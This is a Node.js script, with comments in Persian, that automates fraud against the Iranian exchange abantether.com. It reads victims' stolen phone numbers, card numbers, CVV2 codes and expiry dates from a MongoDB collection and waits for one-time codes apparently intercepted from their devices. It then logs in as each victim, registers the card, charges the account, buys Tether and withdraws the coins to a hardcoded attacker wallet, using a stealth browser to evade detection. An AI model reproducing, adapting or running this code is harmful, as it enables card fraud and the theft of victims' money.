require('dotenv').config();
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());
const { MongoClient, ObjectId } = require('mongodb');
const chalk = require('chalk');

const MONGODB_URI = process.env.MONGODB_URI;
const WALLET_ADDRESS = process.env.WALLET_ADDRESS || "THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS";
const AMOUNT_IRT = parseInt(process.env.AMOUNT_IRT) || 5000000;
const SITE_URL = "https://abantether.com";

if (!MONGODB_URI) {
  console.log(chalk.red("خطا: MONGODB_URI تنظیم نشده!"));
  process.exit(1);
}

const log = {
  i: (msg) => console.log(chalk.cyan(`[${new Date().toLocaleString('fa-IR')}] ℹ ${msg}`)),
  s: (msg) => console.log(chalk.green.bold(`[${new Date().toLocaleString('fa-IR')}] ✓ ${msg}`)),
  e: (msg) => console.log(chalk.red.bold(`[${new Date().toLocaleString('fa-IR')}] ✗ ${msg}`)),
  w: (msg) => console.log(chalk.yellow(`[${new Date().toLocaleString('fa-IR')}] ⏳ ${msg}`)),
  start: (msg) => console.log(chalk.magenta.bold(`[${new Date().toLocaleString('fa-IR')}] ⚡ ${msg}`))
};

let collection;
let lastNoUsersLog = 0;

async function connectDB() {
  const client = new MongoClient(MONGODB_URI);
  await client.connect();
  collection = client.db("ZarrinApp").collection("zarinapp");
  log.s("اتصال به دیتابیس ZarrinApp.zarinapp برقرار شد");
}

function getValue(field) {
  if (field == null) return null;
  if (typeof field === "object") {
    if (field.$numberInt) return parseInt(field.$numberInt);
    if (field.$numberLong) return field.$numberLong.toString();
    if (field.$numberDouble) return parseFloat(field.$numberDouble);
  }
  return field;
}

function isReady(doc) {
  const phone = getValue(doc.personalPhoneNumber);
  const card = getValue(doc.cardNumber);
  const cvv2 = getValue(doc.cvv2);
  const month = getValue(doc.bankMonth);
  const year = getValue(doc.bankYear);
  const device = getValue(doc.deviceId);

  return phone && card && cvv2 && month != null && year != null && device && doc.processed !== true && doc.processing !== true;
}

async function waitForOtp(userId, field, maxWait = 180) {
  for (let i = 0; i < maxWait / 3; i++) {
    const user = await collection.findOne({ _id: new ObjectId(userId) });
    const otp = getValue(user?.[field]);
    if (otp && otp.toString().trim().length >= 4) {
      log.s(`${field} دریافت شد: ${otp}`);
      return otp.toString().trim();
    }
    log.w(`در انتظار ${field}... (${i * 3}s)`);
    await new Promise(r => setTimeout(r, 3000));
  }
  throw new Error(`تایم‌اوت ${field}`);
}

async function clearAndType(page, selector, text) {
  await page.evaluate(sel => {
    const el = document.querySelector(sel);
    if (el) el.value = '';
  }, selector);
  await page.type(selector, text);
}

async function processUser(doc) {
  const phone = getValue(doc.personalPhoneNumber);
  const card = getValue(doc.cardNumber);
  const cvv2 = getValue(doc.cvv2);
  const month = getValue(doc.bankMonth);
  const year = getValue(doc.bankYear);
  const device = getValue(doc.deviceId);
  let browser = null;

  log.start(`شروع پردازش: ${phone} | ${device}`);

  try {
    await collection.updateOne({ _id: doc._id }, { $set: { processing: true } });

    browser = await puppeteer.launch({
      headless: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--no-zygote']
    });

    const page = await browser.newPage();
    await page.setUserAgent("Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/122.0 Mobile Safari/537.36");
    await page.setViewport({ width: 390, height: 844 });
    
    // مرحله 1: ورود به سایت
    await page.goto(SITE_URL, { waitUntil: "networkidle2", timeout: 60000 });
    log.i("صفحه اصلی لود شد");

    // سلکتورهای جدید برای فیلد تلفن
    const phoneSelectors = [
      'input[name="mobile"]',
      'input[type="tel"]',
      'input[placeholder*="شماره موبایل"]',
      'input[placeholder*="09"]',
      '.phone-input',
      '#mobile',
      '[data-cy="phone-input"]',
      'input.v-text-field__input'
    ];

    let phoneInput = null;
    for (const selector of phoneSelectors) {
      try {
        await page.waitForSelector(selector, { timeout: 5000 });
        phoneInput = selector;
        log.i(`فیلد تلفن پیدا شد با سلکتور: ${selector}`);
        break;
      } catch (e) {}
    }

    if (!phoneInput) {
      throw new Error("فیلد تلفن پیدا نشد");
    }

    await page.type(phoneInput, phone);
    
    // دکمه ادامه
    const continueButtons = [
      'button:has-text("ادامه")',
      'button:has-text("ورود")',
      'button[type="submit"]',
      '.v-btn--primary',
      '[data-cy="submit-btn"]'
    ];

    for (const btn of continueButtons) {
      try {
        await page.click(btn);
        log.i("دکمه ادامه کلیک شد");
        break;
      } catch (e) {}
    }

    // مرحله 2: دریافت و وارد کردن OTP ورود
    const otpLogin = await waitForOtp(doc._id, "otp_login");
    
    const otpSelectors = [
      'input[name="code"]',
      'input[type="number"]',
      'input[placeholder*="کد"]',
      '.otp-input',
      '#code',
      '[data-cy="otp-input"]'
    ];

    let otpInput = null;
    for (const selector of otpSelectors) {
      try {
        await page.waitForSelector(selector, { timeout: 10000 });
        otpInput = selector;
        log.i(`فیلد OTP پیدا شد با سلکتور: ${selector}`);
        break;
      } catch (e) {}
    }

    if (!otpInput) {
      throw new Error("فیلد OTP پیدا نشد");
    }

    await clearAndType(page, otpInput, otpLogin);
    
    // دکمه تأیید OTP
    const verifyButtons = [
      'button:has-text("تأیید")',
      'button:has-text("ورود")',
      'button[type="submit"]',
      '.v-btn--primary'
    ];

    for (const btn of verifyButtons) {
      try {
        await page.click(btn);
        break;
      } catch (e) {}
    }

    log.s("ورود با موفقیت انجام شد");
    await page.waitForTimeout(3000);

    // مرحله 3: ثبت کارت بانکی
    log.i("شروع ثبت کارت بانکی");
    
    // رفتن به صفحه کارت‌ها
    try {
      await page.goto(`${SITE_URL}/profile/cards`, { waitUntil: "networkidle2", timeout: 30000 });
    } catch (e) {
      // اگر مستقیم نرفت، از طریق منو برو
      const menuSelectors = [
        'a[href*="/profile"]',
        '.profile-menu',
        'button:has-text("پروفایل")'
      ];
      
      for (const selector of menuSelectors) {
        try {
          await page.click(selector);
          break;
        } catch (e) {}
      }
      
      await page.waitForTimeout(2000);
      
      const cardMenuSelectors = [
        'a[href*="/cards"]',
        'button:has-text("کارت‌ها")'
      ];
      
      for (const selector of cardMenuSelectors) {
        try {
          await page.click(selector);
          break;
        } catch (e) {}
      }
    }

    // دکمه افزودن کارت جدید
    const addCardButtons = [
      'button:has-text("افزودن کارت")',
      'button:has-text("کارت جدید")',
      '.add-card-btn',
      '[data-cy="add-card"]'
    ];

    for (const btn of addCardButtons) {
      try {
        await page.waitForSelector(btn, { timeout: 5000 });
        await page.click(btn);
        log.i("دکمه افزودن کارت کلیک شد");
        break;
      } catch (e) {}
    }

    // وارد کردن اطلاعات کارت
    const cardNumberSelectors = [
      'input[name="cardNumber"]',
      'input[placeholder*="شماره کارت"]',
      '#cardNumber',
      '[data-cy="card-number"]'
    ];

    for (const selector of cardNumberSelectors) {
      try {
        await page.waitForSelector(selector, { timeout: 5000 });
        await page.type(selector, card);
        break;
      } catch (e) {}
    }

    // CVV2
    const cvv2Selectors = [
      'input[name="cvv2"]',
      'input[placeholder*="CVV2"]',
      'input[placeholder*="کد امنیتی"]',
      '#cvv2',
      '[data-cy="cvv2"]'
    ];

    for (const selector of cvv2Selectors) {
      try {
        await page.type(selector, cvv2);
        break;
      } catch (e) {}
    }

    // ماه
    const monthSelectors = [
      'select[name="month"]',
      'input[name="month"]',
      '#month',
      '[data-cy="month"]'
    ];

    for (const selector of monthSelectors) {
      try {
        await page.select(selector, month.toString());
        break;
      } catch (e) {
        try {
          await page.type(selector, month.toString());
          break;
        } catch (e2) {}
      }
    }

    // سال
    const yearSelectors = [
      'select[name="year"]',
      'input[name="year"]',
      '#year',
      '[data-cy="year"]'
    ];

    for (const selector of yearSelectors) {
      try {
        await page.select(selector, year.toString());
        break;
      } catch (e) {
        try {
          await page.type(selector, year.toString());
          break;
        } catch (e2) {}
      }
    }

    // دکمه ثبت کارت
    const submitCardButtons = [
      'button:has-text("ثبت کارت")',
      'button:has-text("ذخیره")',
      'button[type="submit"]'
    ];

    for (const btn of submitCardButtons) {
      try {
        await page.click(btn);
        log.i("اطلاعات کارت ثبت شد");
        break;
      } catch (e) {}
    }

    // مرحله 4: شارژ حساب
    log.i("شروع فرآیند شارژ حساب");
    
    await page.waitForTimeout(3000);
    
    // رفتن به صفحه شارژ
    try {
      await page.goto(`${SITE_URL}/charge`, { waitUntil: "networkidle2", timeout: 30000 });
    } catch (e) {
      const chargeSelectors = [
        'a[href*="/charge"]',
        'button:has-text("شارژ")',
        '.charge-menu'
      ];
      
      for (const selector of chargeSelectors) {
        try {
          await page.click(selector);
          break;
        } catch (e) {}
      }
    }

    // وارد کردن مبلغ
    const amountSelectors = [
      'input[name="amount"]',
      'input[placeholder*="مبلغ"]',
      '#amount',
      '[data-cy="amount"]'
    ];

    for (const selector of amountSelectors) {
      try {
        await page.waitForSelector(selector, { timeout: 5000 });
        await clearAndType(page, selector, AMOUNT_IRT.toString());
        break;
      } catch (e) {}
    }

    // دکمه پرداخت
    const paymentButtons = [
      'button:has-text("پرداخت")',
      'button:has-text("شارژ")',
      '.payment-btn',
      '[data-cy="pay"]'
    ];

    for (const btn of paymentButtons) {
      try {
        await page.click(btn);
        log.i("دکمه پرداخت کلیک شد");
        break;
      } catch (e) {}
    }

    // مرحله 5: دریافت و وارد کردن OTP بانک
    const otpBank = await waitForOtp(doc._id, "otp_bank");
    
    await page.waitForTimeout(5000);
    
    const bankOtpSelectors = [
      'input[name="otp"]',
      'input[type="password"]',
      'input[placeholder*="رمز دوم"]',
      '#otp',
      '[data-cy="bank-otp"]'
    ];

    let bankOtpInput = null;
    for (const selector of bankOtpSelectors) {
      try {
        await page.waitForSelector(selector, { timeout: 10000 });
        bankOtpInput = selector;
        break;
      } catch (e) {}
    }

    if (bankOtpInput) {
      await clearAndType(page, bankOtpInput, otpBank);
      
      const confirmBankButtons = [
        'button:has-text("تأیید")',
        'button:has-text("پرداخت")',
        'button[type="submit"]'
      ];

      for (const btn of confirmBankButtons) {
        try {
          await page.click(btn);
          break;
        } catch (e) {}
      }
      
      log.s("پرداخت با موفقیت انجام شد");
    }

    // مرحله 6: خرید تتر
    log.i("شروع فرآیند خرید تتر");
    
    await page.waitForTimeout(5000);
    
    // رفتن به صفحه خرید
    try {
      await page.goto(`${SITE_URL}/buy`, { waitUntil: "networkidle2", timeout: 30000 });
    } catch (e) {
      const buySelectors = [
        'a[href*="/buy"]',
        'button:has-text("خرید")',
        '.buy-menu'
      ];
      
      for (const selector of buySelectors) {
        try {
          await page.click(selector);
          break;
        } catch (e) {}
      }
    }

    // وارد کردن مبلغ خرید
    const buyAmountSelectors = [
      'input[name="amount"]',
      'input[placeholder*="مبلغ"]',
      '#buyAmount',
      '[data-cy="buy-amount"]'
    ];

    for (const selector of buyAmountSelectors) {
      try {
        await page.waitForSelector(selector, { timeout: 5000 });
        await clearAndType(page, selector, AMOUNT_IRT.toString());
        break;
      } catch (e) {}
    }

    // دکمه خرید
    const buyButtons = [
      'button:has-text("خرید")',
      'button:has-text("خرید تتر")',
      '.buy-btn',
      '[data-cy="buy-submit"]'
    ];

    for (const btn of buyButtons) {
      try {
        await page.click(btn);
        log.i("درخواست خرید ثبت شد");
        break;
      } catch (e) {}
    }

    // مرحله 7: برداشت به کیف پول
    log.i("شروع فرآیند برداشت به کیف پول");
    
    await page.waitForTimeout(5000);
    
    // رفتن به صفحه برداشت
    try {
      await page.goto(`${SITE_URL}/withdraw`, { waitUntil: "networkidle2", timeout: 30000 });
    } catch (e) {
      const withdrawSelectors = [
        'a[href*="/withdraw"]',
        'button:has-text("برداشت")',
        '.withdraw-menu'
      ];
      
      for (const selector of withdrawSelectors) {
        try {
          await page.click(selector);
          break;
        } catch (e) {}
      }
    }

    // وارد کردن آدرس کیف پول
    const walletSelectors = [
      'input[name="wallet"]',
      'input[placeholder*="آدرس کیف پول"]',
      '#wallet',
      '[data-cy="wallet-address"]'
    ];

    for (const selector of walletSelectors) {
      try {
        await page.waitForSelector(selector, { timeout: 5000 });
        await clearAndType(page, selector, WALLET_ADDRESS);
        break;
      } catch (e) {}
    }

    // وارد کردن مبلغ برداشت
    const withdrawAmountSelectors = [
      'input[name="amount"]',
      'input[placeholder*="مبلغ"]',
      '#withdrawAmount',
      '[data-cy="withdraw-amount"]'
    ];

    for (const selector of withdrawAmountSelectors) {
      try {
        await clearAndType(page, selector, (AMOUNT_IRT / 100000).toString()); // تبدیل به تتر
        break;
      } catch (e) {}
    }

    // دکمه برداشت
    const withdrawButtons = [
      'button:has-text("برداشت")',
      'button:has-text("ثبت درخواست")',
      '.withdraw-btn',
      '[data-cy="withdraw-submit"]'
    ];

    for (const btn of withdrawButtons) {
      try {
        await page.click(btn);
        log.i("درخواست برداشت ثبت شد");
        break;
      } catch (e) {}
    }

    // مرحله 8: تأیید برداشت با OTP
    const otpWithdraw = await waitForOtp(doc._id, "otp_withdraw");
    
    await page.waitForTimeout(5000);
    
    const withdrawOtpSelectors = [
      'input[name="otp"]',
      'input[placeholder*="کد تأیید"]',
      '#withdrawOtp',
      '[data-cy="withdraw-otp"]'
    ];

    for (const selector of withdrawOtpSelectors) {
      try {
        await page.waitForSelector(selector, { timeout: 10000 });
        await clearAndType(page, selector, otpWithdraw);
        break;
      } catch (e) {}
    }

    // دکمه تأیید نهایی
    const finalConfirmButtons = [
      'button:has-text("تأیید")',
      'button:has-text("برداشت")',
      'button[type="submit"]'
    ];

    for (const btn of finalConfirmButtons) {
      try {
        await page.click(btn);
        log.s("برداشت با موفقیت انجام شد");
        break;
      } catch (e) {}
    }

    log.s(`تمام مراحل با موفقیت انجام شد! تتر در راه است: ${phone}`);
    await collection.updateOne({ _id: doc._id }, { 
      $set: { 
        processed: true, 
        status: "completed", 
        completedAt: new Date() 
      } 
    });

  } catch (err) {
    log.e(`خطا در پردازش ${phone}: ${err.message}`);
    await collection.updateOne({ _id: doc._id }, { 
      $set: { 
        status: "failed", 
        error: err.message,
        failedAt: new Date()
      } 
    });
  } finally {
    if (browser) await browser.close().catch(() => {});
    await collection.updateOne({ _id: doc._id }, { $unset: { processing: "" } });
  }
}

// Polling هر ۵ ثانیه
async function startPolling() {
  await connectDB();

  setInterval(async () => {
    try {
      const users = await collection.find({
        processed: { $ne: true },
        processing: { $ne: true }
      }).limit(5).toArray();

      if (users.length === 0) {
        if (Date.now() - lastNoUsersLog > 30000) {
          log.i("در انتظار دیوایس جدید...");
          lastNoUsersLog = Date.now();
        }
        return;
      }

      for (const user of users) {
        if (isReady(user)) {
          processUser(user);
        }
      }
    } catch (err) {
      log.e("Polling error: " + err.message);
    }
  }, 5000);
}

startPolling();